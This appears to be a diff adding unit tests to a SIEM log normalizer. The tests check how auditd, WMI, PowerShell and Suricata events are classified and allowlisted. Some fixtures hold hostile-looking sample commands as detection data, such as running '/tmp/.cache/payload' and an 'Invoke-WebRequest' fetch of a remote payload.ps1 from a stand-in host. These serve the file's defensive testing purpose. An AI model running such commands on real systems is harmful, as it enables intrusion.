@@ -1,6 +1,7 @@
 import importlib.util
 import json
 from pathlib import Path
+import re
 import sys
 import types
 import unittest
@@ -39,6 +40,182 @@ apply_rules = normalizer_module.apply_rules
 
 
 class NormalizerCoreTests(unittest.TestCase):
+    def test_copying_deployment_file_from_tmp_is_not_tmp_execution(self) -> None:
+        normalized = apply_rules(
+            [],
+            {
+                "source_type": "syslog",
+                "message": (
+                    "<182>1 2026-07-26T09:55:00+00:00 siem-web auditd - - - "
+                    'type=EXECVE msg=audit(1785069300.100:222): argc=6 '
+                    'a0="install" a1="-m" a2="0644" a3="/tmp/deploy.service" '
+                    'a4="/etc/systemd/system/deploy.service" a5=""'
+                ),
+                "source": "10.20.10.107",
+            },
+        )
+
+        assert normalized is not None
+        self.assertNotEqual("linux_exec_from_tmp", normalized.get("event.type"))
+
+    def test_executing_binary_from_tmp_is_tmp_execution(self) -> None:
+        normalized = apply_rules(
+            [],
+            {
+                "source_type": "syslog",
+                "message": (
+                    "<182>1 2026-07-26T09:55:00+00:00 siem-web auditd - - - "
+                    'type=EXECVE msg=audit(1785069300.100:223): argc=2 '
+                    'a0="/tmp/.cache/payload" a1="--run"'
+                ),
+                "source": "10.20.10.107",
+            },
+        )
+
+        assert normalized is not None
+        self.assertEqual("linux_exec_from_tmp", normalized.get("event.type"))
+
+    def test_local_wmi_query_is_not_remote_activity(self) -> None:
+        normalized = apply_rules(
+            [],
+            {
+                "source_type": "json",
+                "message": json.dumps(
+                    {
+                        "winlog": {
+                            "event_id": 5858,
+                            "channel": "Microsoft-Windows-WMI-Activity/Operational",
+                            "provider_name": "Microsoft-Windows-WMI-Activity",
+                            "computer_name": "DESKTOP-5JMJVBH",
+                        },
+                        "message": (
+                            "ClientMachine = DESKTOP-5JMJVBH; User = NT AUTHORITY\\SYSTEM; "
+                            "Operation = Start IWbemServices::ExecQuery - root\\cimv2 : "
+                            "SELECT * FROM Win32_DeviceGuard; ResultCode = 0x80041032"
+                        ),
+                    }
+                ),
+                "source": "DESKTOP-5JMJVBH",
+            },
+        )
+
+        assert normalized is not None
+        self.assertEqual("wmi_local_query", normalized.get("event.action"))
+        self.assertEqual("DESKTOP-5JMJVBH", normalized.get("wmi.client_machine"))
+
+    def test_remote_wmi_process_creation_is_high_signal(self) -> None:
+        normalized = apply_rules(
+            [],
+            {
+                "source_type": "json",
+                "message": json.dumps(
+                    {
+                        "winlog": {
+                            "event_id": 5858,
+                            "channel": "Microsoft-Windows-WMI-Activity/Operational",
+                            "provider_name": "Microsoft-Windows-WMI-Activity",
+                            "computer_name": "WIN-SERVER-01",
+                        },
+                        "message": (
+                            "ClientMachine = ADMIN-WS-01; User = LAB\\operator; "
+                            "Operation = Start IWbemServices::ExecMethod - root\\cimv2 : "
+                            "Win32_Process::Create"
+                        ),
+                    }
+                ),
+                "source": "WIN-SERVER-01",
+            },
+        )
+
+        assert normalized is not None
+        self.assertEqual("wmi_remote_execution", normalized.get("event.action"))
+
+    def test_rfc5424_timestamp_and_audit_identity_are_stable(self) -> None:
+        raw_event = {
+            "source_type": "syslog",
+            "message": (
+                "<182>1 2026-07-26T07:37:54.426413+00:00 siem-processing auditd - - - "
+                'type=EXECVE msg=audit(1785051474.424:280833): argc=2 a0="id" a1="-u"'
+            ),
+            "source": "10.20.10.105",
+            "log_source": "10.20.10.105",
+        }
+
+        first = apply_rules([], raw_event)
+        second = apply_rules([], dict(raw_event))
+
+        self.assertIsNotNone(first)
+        self.assertIsNotNone(second)
+        assert first is not None and second is not None
+        self.assertEqual("2026-07-26T07:37:54.426413Z", first.get("@timestamp"))
+        self.assertEqual("1785051474.424:280833", first.get("audit.id"))
+        self.assertRegex(str(first.get("event.id")), r"^audit-[0-9a-f]{32}$")
+        self.assertEqual(first.get("event.id"), second.get("event.id"))
+
+    def test_audit_path_records_have_distinct_stable_event_ids(self) -> None:
+        prefix = (
+            "<182>1 2026-07-26T07:37:54+00:00 siem-processing auditd - - - "
+            "type=PATH msg=audit(1785051474.424:280834): "
+        )
+        first = apply_rules(
+            [],
+            {
+                "source_type": "syslog",
+                "message": prefix + 'item=0 name="/tmp/one" nametype=NORMAL',
+                "source": "10.20.10.105",
+            },
+        )
+        second = apply_rules(
+            [],
+            {
+                "source_type": "syslog",
+                "message": prefix + 'item=1 name="/tmp/two" nametype=NORMAL',
+                "source": "10.20.10.105",
+            },
+        )
+
+        assert first is not None and second is not None
+        self.assertNotEqual(first.get("event.id"), second.get("event.id"))
+
+    def test_bsd_syslog_timestamp_is_normalized(self) -> None:
+        normalized = apply_rules(
+            [],
+            {
+                "source_type": "syslog",
+                "message": "<6>Jul 26 07:37:54 siem-processing sshd[42]: Accepted publickey for ops from 192.168.3.81 port 51111",
+                "source": "10.20.10.105",
+            },
+        )
+
+        assert normalized is not None
+        self.assertRegex(str(normalized.get("@timestamp")), r"^\d{4}-07-26T07:37:54Z$")
+
+    def test_pve_bsd_syslog_timestamp_uses_moscow_timezone(self) -> None:
+        normalized = apply_rules(
+            [],
+            {
+                "source_type": "syslog",
+                "message": "<6>Jul 26 06:00:00 pve pvedaemon[42]: production transport check",
+                "source": "10.20.10.1",
+            },
+        )
+
+        assert normalized is not None
+        self.assertRegex(str(normalized.get("@timestamp")), r"^\d{4}-07-26T03:00:00Z$")
+
+    def test_vpn_host_bsd_syslog_timestamp_uses_moscow_timezone(self) -> None:
+        normalized = apply_rules(
+            [],
+            {
+                "source_type": "syslog",
+                "message": "<4>Jul 26 15:28:25 vpn-host-khanov kernel: [UFW BLOCK] SRC=85.217.140.8 DST=176.108.250.215",
+                "source": "176.108.250.215",
+            },
+        )
+
+        assert normalized is not None
+        self.assertRegex(str(normalized.get("@timestamp")), r"^\d{4}-07-26T12:28:25Z$")
+
     def test_systemd_resolved_transaction_becomes_dns_query(self) -> None:
         raw_event = {
             "source_type": "syslog",
@@ -353,6 +530,129 @@ class NormalizerCoreTests(unittest.TestCase):
         assert normalized is not None
         self.assertEqual("windows_powershell_encoded_command", normalized.get("event.type"))
         self.assertEqual("powershell_encoded_command", normalized.get("event.action"))
+
+    def test_windows_siem_operator_automation_is_narrowly_allowlisted(self) -> None:
+        raw_event = {
+            "source_type": "windows_event_json",
+            "source": "DESKTOP-5JMJVBH",
+            "computer_name": "DESKTOP-5JMJVBH",
+            "channel": "Microsoft-Windows-PowerShell/Operational",
+            "provider": "Microsoft-Windows-PowerShell",
+            "event_id": 4100,
+            "message": (
+                r"$env:SIEM_PROXMOX_HOST='192.168.3.101'; "
+                r"Set-Location C:\Users\Rdegon\Projects\siem-solution-clean; "
+                "from deploy.soc_foundation_provision import Proxmox"
+            ),
+        }
+
+        normalized = apply_rules([], raw_event)
+
+        self.assertIsNotNone(normalized)
+        assert normalized is not None
+        self.assertIn("allowlist:siem_operator_automation", normalized.get("tags") or [])
+
+    def test_generic_windows_powershell_is_not_operator_allowlisted(self) -> None:
+        raw_event = {
+            "source_type": "windows_event_json",
+            "source": "DESKTOP-5JMJVBH",
+            "computer_name": "DESKTOP-5JMJVBH",
+            "channel": "Microsoft-Windows-PowerShell/Operational",
+            "provider": "Microsoft-Windows-PowerShell",
+            "event_id": 4104,
+            "message": "Invoke-WebRequest https://example.invalid/payload.ps1",
+        }
+
+        normalized = apply_rules([], raw_event)
+
+        self.assertIsNotNone(normalized)
+        assert normalized is not None
+        self.assertNotIn("allowlist:siem_operator_automation", normalized.get("tags") or [])
+
+    def test_approved_scanner_windows_network_logon_probe_is_allowlisted(self) -> None:
+        raw_event = {
+            "source_type": "windows_event_json",
+            "source": "DESKTOP-5JMJVBH",
+            "computer_name": "DESKTOP-5JMJVBH",
+            "channel": "Security",
+            "provider": "Microsoft-Windows-Security-Auditing",
+            "event_id": 4625,
+            "message": "An account failed to log on.\r\n\r\nLogon Type:\t\t\t3",
+            "windows": {
+                "event_data": {
+                    "TargetUserName": "administrator",
+                        "IpAddress": "10.20.30.122",
+                    "LogonType": "3",
+                }
+            },
+        }
+
+        normalized = apply_rules([], raw_event)
+
+        self.assertIsNotNone(normalized)
+        assert normalized is not None
+        self.assertIn("allowlist:siem_approved_scanner", normalized.get("tags") or [])
+
+    def test_approved_scanner_suricata_alert_is_allowlisted(self) -> None:
+        raw_event = {
+            "source_type": "syslog",
+            "source": "lab-edge-01",
+            "log_source": "lab-edge-01",
+            "message": (
+                "<180>1 2026-07-26T17:55:44+03:00 lab-edge-01 suricata-fast - - - "
+                "07/26/2026-17:55:44 [**] [1:2024364:5] "
+                "SURICATA TLS invalid record/traffic [**] "
+                "[Classification: Protocol Command Decode] [Priority: 3] "
+                "{TCP} 10.20.30.122:47538 -> 10.20.10.107:80"
+            ),
+        }
+
+        normalized = apply_rules([], raw_event)
+
+        self.assertIsNotNone(normalized)
+        assert normalized is not None
+        self.assertEqual("suricata_alert", normalized.get("event.type"))
+        self.assertIn("allowlist:siem_approved_scanner", normalized.get("tags") or [])
+
+    def test_unapproved_suricata_nmap_alert_is_not_allowlisted(self) -> None:
+        raw_event = {
+            "source_type": "syslog",
+            "source": "lab-edge-01",
+            "log_source": "lab-edge-01",
+            "message": (
+                "<180>1 2026-07-26T17:55:44+03:00 lab-edge-01 suricata-fast - - - "
+                "07/26/2026-17:55:44 [**] [1:2024364:5] "
+                "ET SCAN Possible Nmap User-Agent Observed [**] "
+                "[Classification: Web Application Attack] [Priority: 1] "
+                "{TCP} 10.20.20.121:47538 -> 10.20.10.107:80"
+            ),
+        }
+
+        normalized = apply_rules([], raw_event)
+
+        self.assertIsNotNone(normalized)
+        assert normalized is not None
+        self.assertNotIn("allowlist:siem_approved_scanner", normalized.get("tags") or [])
+
+    def test_managed_lab_edge_rsyslog_change_is_allowlisted(self) -> None:
+        raw_event = {
+            "source_type": "syslog",
+            "source": "lab-edge-01",
+            "log_source": "lab-edge-01",
+            "message": (
+                '<182>1 2026-07-26T13:44:38+03:00 lab-edge-01 auditd - - - '
+                'type=SYSCALL msg=audit(1785062678.697:5362): syscall=257 success=yes '
+                'auid=4294967295 uid=0 gid=0 tty=(none) comm="bash" exe="/usr/bin/bash" '
+                'key="rsyslog_config"'
+            ),
+        }
+
+        normalized = apply_rules([], raw_event)
+
+        self.assertIsNotNone(normalized)
+        assert normalized is not None
+        self.assertEqual("linux_rsyslog_config_modified", normalized.get("event.type"))
+        self.assertIn("allowlist:siem_managed_rsyslog_change", normalized.get("tags") or [])
 
     def test_windows_rendered_security_message_is_normalized_without_event_code(self) -> None:
         raw_event = {
